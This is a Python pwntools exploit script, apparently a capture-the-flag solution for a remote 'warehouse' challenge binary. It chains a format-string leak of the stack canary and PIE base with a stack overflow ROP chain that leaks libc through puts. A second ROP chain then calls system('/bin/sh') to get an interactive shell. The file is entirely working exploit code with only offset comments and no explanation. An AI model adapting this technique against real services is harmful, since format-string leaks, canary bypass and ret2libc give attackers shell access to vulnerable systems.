from pwn import *

#p = process("./warehouse_patched")
p = remote('0.cloud.chals.io', 16738)
rop = ROP('./warehouse')

libc = ELF('libc.so.6')

lrop = ROP(libc)

def create(name, price, qty):
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b'name:')
    
    p.sendline(name)
    p.recvuntil(b'price:')
    p.sendline(str(price))
    p.recvuntil(b'qty:')
    p.sendline(str(qty))

def view():
    p.recvuntil(b'>')
    p.sendline(b'2')

def leave():
    p.recvuntil(b'>')
    p.sendline(b'3')
    return p.recvuntil(b'Goodbye.\n')

def logs():
    p.recvuntil(b'>')
    p.sendline(b'4')
    return p.recvuntil(b'1)')
create(b'%29$p %11$p',1,1)

all = logs()
all = all.split(b'\n')
targets = all[-3].split(b' ')
canary = int(targets[5],16)
create_prod = int(targets[6],16) - 265
start = create_prod - 0x16f0

got = create_prod + 265 + 0x1807

putsPLT = start + 0x1060
putsgot = got + 0xf10

rdi = rop.rdi.address + start

rsi = rop.rsi.address + start

write_loc = start + 0x3800
print(hex(create_prod))

create(b'a'*0x48 + p64(canary) + b'a'*(0x40 - len(p64(canary))) + p64(rdi) + p64(putsgot) + p64(putsPLT) + p64(rop.ret.address + start) + p64(rop.ret.address + start) + p64(0x1d12 + start),1,1)

leave()

leak = p.recvline()[:-1]
uleak = u64(leak + b'\x00' * (8 - len(leak)))
print(leak)

base = uleak - libc.symbols['puts']

write = 0xa78d6 + base

rcx = lrop.rcx.address + base
rdx = lrop.rdx.address + base


syscall = libc.symbols['system'] + base

payload = b'a'*0x48 + p64(canary) + b'a'*(0x40 - len(p64(canary)))
payload+=p64(rcx) + b'/bin/sh\x00'
payload+=p64(rdi) + p64(write_loc)
payload+=p64(write)
payload+=p64(rdi) + p64(write_loc)
payload+=p64(rsi) + p64(0x0)
payload+=p64(rdx) + p64(0x0)
payload+=p64(syscall)

create(payload,1,1)

p.interactive()

#0x568943709720
#0x56894370b1f0
#0x00000000000a78d6 = mov rdi rcx
#Canary at %29$p    __libc_start_call_main+122 @ %39$p
#%11$p = create_product+265